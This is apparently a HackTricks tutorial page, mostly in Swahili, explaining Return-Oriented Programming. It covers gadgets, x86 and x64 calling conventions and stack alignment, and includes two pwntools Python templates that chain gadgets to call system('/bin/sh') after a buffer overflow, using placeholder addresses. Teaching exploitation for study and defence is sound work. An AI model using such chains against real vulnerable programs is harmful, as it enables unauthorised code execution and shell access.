# ROP - Return Oriented Programing

{{#include ../../../banners/hacktricks-training.md}}

## **Taarifa za Msingi**

**Return-Oriented Programming (ROP)** ni mbinu ya kisasa ya unyakuzi inayotumika kukwepa hatua za usalama kama **No-Execute (NX)** au **Data Execution Prevention (DEP)**. Badala ya kuingiza na kutekeleza shellcode, mshambuliaji anatumia vipande vya msimbo vilivyopo tayari katika binary au katika maktaba zilizopakiwa, vinavyojulikana kama **"gadgets"**. Kila gadget kwa kawaida huishia na amri ya `ret` na inatekeleza operesheni ndogo, kama vile kuhamasisha data kati ya register au kufanya operesheni za hesabu. Kwa kuunganisha gadgets hizi pamoja, mshambuliaji anaweza kujenga payload ili kufanya operesheni zisizo na mipaka, kwa ufanisi akikwepa ulinzi wa NX/DEP.

### Jinsi ROP Inavyofanya Kazi

1. **Kuhujumu Mwelekeo wa Udhibiti**: Kwanza, mshambuliaji anahitaji kuhujumu mwelekeo wa udhibiti wa programu, kwa kawaida kwa kutumia unyakuzi wa buffer overflow ili kuandika anwani ya kurudi iliyohifadhiwa kwenye stack.
2. **Kuunganisha Gadgets**: Mshambuliaji kisha anachagua kwa makini na kuunganisha gadgets ili kufanya vitendo vinavyotakiwa. Hii inaweza kujumuisha kuweka hoja za wito wa kazi, kuita kazi hiyo (kwa mfano, `system("/bin/sh")`), na kushughulikia usafishaji wowote unaohitajika au operesheni za ziada.
3. **Utekelezaji wa Payload**: Wakati kazi iliyo hatarini inaporudi, badala ya kurudi kwenye eneo halali, inaanza kutekeleza mnyororo wa gadgets.

### Zana

Kwa kawaida, gadgets zinaweza kupatikana kwa kutumia **[ROPgadget](https://github.com/JonathanSalwan/ROPgadget)**, **[ropper](https://github.com/sashs/Ropper)** au moja kwa moja kutoka **pwntools** ([ROP](https://docs.pwntools.com/en/stable/rop/rop.html)).

## Mnyororo wa ROP katika Mfano wa x86

### **x86 (32-bit) Mikataba ya Kuita**

- **cdecl**: Mtu anayepiga simu anasafisha stack. Hoja za kazi zinawekwa kwenye stack kwa mpangilio wa kinyume (kulia-kushoto). **Hoja zinawekwa kwenye stack kutoka kulia kwenda kushoto.**
- **stdcall**: Inafanana na cdecl, lakini mtu anayepigiwa simu ndiye anayehusika na kusafisha stack.

### **Kugundua Gadgets**

Kwanza, hebu tuwe na dhana kwamba tumegundua gadgets zinazohitajika ndani ya binary au maktaba zake zilizopakiwa. Gadgets tunazovutiwa nazo ni:

- `pop eax; ret`: Gadget hii inachukua thamani ya juu ya stack na kuhamasisha kwenye register ya `EAX` na kisha inarudi, ikitupa udhibiti wa `EAX`.
- `pop ebx; ret`: Inafanana na ile iliyotangulia, lakini kwa register ya `EBX`, ikiruhusu udhibiti wa `EBX`.
- `mov [ebx], eax; ret`: Inahamisha thamani katika `EAX` kwenda kwenye eneo la kumbukumbu linaloashiriwa na `EBX` na kisha inarudi. Hii mara nyingi inaitwa **write-what-where gadget**.
- Zaidi ya hayo, tuna anwani ya kazi ya `system()` inapatikana.

### **Mnyororo wa ROP**

Kwa kutumia **pwntools**, tunaandaa stack kwa ajili ya utekelezaji wa mnyororo wa ROP kama ifuatavyo tukilenga kutekeleza `system('/bin/sh')`, angalia jinsi mnyororo unavyoanza na:

1. Amri ya `ret` kwa ajili ya kusawazisha (hiari)
2. Anwani ya kazi ya `system` (tukidhani ASLR imezimwa na libc inajulikana, maelezo zaidi katika [**Ret2lib**](ret2lib/))
3. Mahali pa kurudi kutoka kwa `system()`
4. Anwani ya string `"/bin/sh"` (hoja kwa kazi ya system)
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadc0de

# A gadget to control the return address, typically found through analysis
ret_gadget = 0xcafebabe  # This could be any gadget that allows us to control the return address

# Construct the ROP chain
rop_chain = [
ret_gadget,    # This gadget is used to align the stack if necessary, especially to bypass stack alignment issues
system_addr,   # Address of system(). Execution will continue here after the ret gadget
0x41414141,    # Placeholder for system()'s return address. This could be the address of exit() or another safe place.
bin_sh_addr    # Address of "/bin/sh" string goes here, as the argument to system()
]

# Flatten the rop_chain for use
rop_chain = b''.join(p32(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
## ROP Chain in x64 Example

### **x64 (64-bit) Calling conventions**

- Inatumia **System V AMD64 ABI** calling convention kwenye mifumo ya Unix-like, ambapo **hoja za kwanza sita za nambari au pointer zinapitishwa kwenye register `RDI`, `RSI`, `RDX`, `RCX`, `R8`, na `R9`**. Hoja za ziada zinapitishwa kwenye stack. Thamani ya kurudi inawekwa katika `RAX`.
- **Windows x64** calling convention inatumia `RCX`, `RDX`, `R8`, na `R9` kwa hoja za kwanza nne za nambari au pointer, huku hoja za ziada zikipitishwa kwenye stack. Thamani ya kurudi inawekwa katika `RAX`.
- **Registers**: Registers za 64-bit zinajumuisha `RAX`, `RBX`, `RCX`, `RDX`, `RSI`, `RDI`, `RBP`, `RSP`, na `R8` hadi `R15`.

#### **Finding Gadgets**

Kwa kusudi letu, hebu tuzingatie gadgets ambazo zitaturuhusu kuweka register **RDI** (ili kupitisha string **"/bin/sh"** kama hoja kwa **system()**) na kisha kuita kazi ya **system()**. Tutadhani tumetambua gadgets zifuatazo:

- **pop rdi; ret**: Inachukua thamani ya juu ya stack na kuiweka kwenye **RDI** na kisha inarudi. Muhimu kwa kuweka hoja yetu kwa **system()**.
- **ret**: Kurudi rahisi, muhimu kwa usawa wa stack katika hali fulani.

Na tunajua anwani ya kazi ya **system()**.

### **ROP Chain**

Hapa kuna mfano wa kutumia **pwntools** kuandaa na kutekeleza ROP chain inayolenga kutekeleza **system('/bin/sh')** kwenye **x64**:
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadbeefdeadbeef

# Gadgets (hypothetical values)
pop_rdi_gadget = 0xcafebabecafebabe  # pop rdi; ret
ret_gadget = 0xdeadbeefdeadbead     # ret gadget for alignment, if necessary

# Construct the ROP chain
rop_chain = [
ret_gadget,        # Alignment gadget, if needed
pop_rdi_gadget,    # pop rdi; ret
bin_sh_addr,       # Address of "/bin/sh" string goes here, as the argument to system()
system_addr        # Address of system(). Execution will continue here.
]

# Flatten the rop_chain for use
rop_chain = b''.join(p64(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
Katika mfano huu:

- Tunatumia **`pop rdi; ret`** gadget kuweka **`RDI`** kwenye anwani ya **`"/bin/sh"`**.
- Tunaruka moja kwa moja kwenye **`system()`** baada ya kuweka **`RDI`**, na anwani ya **system()** katika mnyororo.
- **`ret_gadget`** inatumika kwa ajili ya usawa ikiwa mazingira ya lengo yanahitaji hivyo, ambayo ni ya kawaida zaidi katika **x64** kuhakikisha usawa sahihi wa stack kabla ya kuita kazi.

### Usawa wa Stack

**The x86-64 ABI** inahakikisha kwamba **stack ina usawa wa byte 16** wakati **amri ya call** inatekelezwa. **LIBC**, ili kuboresha utendaji, **inatumia SSE instructions** (kama **movaps**) ambazo zinahitaji usawa huu. Ikiwa stack haijawekwa sawa (kumanisha **RSP** si mara kadhaa ya 16), simu za kazi kama **system** zitashindwa katika **ROP chain**. Ili kurekebisha hili, ongeza tu **ret gadget** kabla ya kuita **system** katika mnyororo wako wa ROP.

## Tofauti kuu kati ya x86 na x64

> [!TIP]
> Kwa kuwa x64 inatumia register kwa ajili ya hoja chache za kwanza, mara nyingi inahitaji gadgets chache zaidi kuliko x86 kwa simu rahisi za kazi, lakini kupata na kuunganisha gadgets sahihi kunaweza kuwa ngumu zaidi kutokana na kuongezeka kwa idadi ya register na nafasi kubwa ya anwani. Kuongezeka kwa idadi ya register na nafasi kubwa ya anwani katika **x64** architecture kunatoa fursa na changamoto kwa maendeleo ya exploit, hasa katika muktadha wa Return-Oriented Programming (ROP).

## Ulinzi

- [**ASLR**](../common-binary-protections-and-bypasses/aslr/)
- [**Stack Canaries**](../common-binary-protections-and-bypasses/stack-canaries/)

## Mifano Mingine & Marejeleo

- [https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions)

## Mbinu za msingi za ROP

Kumbuka kwamba ROP ni mbinu tu ili kutekeleza msimbo wowote. Kulingana na ROP mbinu nyingi za Ret2XXX zilikuwa zimeendelezwa:

- **Ret2lib**: Tumia ROP kuita kazi zisizo za kawaida kutoka maktaba iliyopakiwa na vigezo vya kawaida (kawaida kitu kama `system('/bin/sh')`.

{{#ref}}
ret2lib/
{{#endref}}

- **Ret2Syscall**: Tumia ROP kuandaa simu kwa syscall, e.g. `execve`, na kufanya itekeleze amri zisizo za kawaida.

{{#ref}}
rop-syscall-execv.md
{{#endref}}

- **EBP2Ret & EBP Chaining**: Ya kwanza itatumia EBP badala ya EIP kudhibiti mtiririko na ya pili ni sawa na Ret2lib lakini katika kesi hii mtiririko unadhibitiwa hasa na anwani za EBP (ingawa pia inahitajika kudhibiti EIP).

{{#ref}}
stack-pivoting-ebp2ret-ebp-chaining.md
{{#endref}}

{{#include ../../../banners/hacktricks-training.md}}
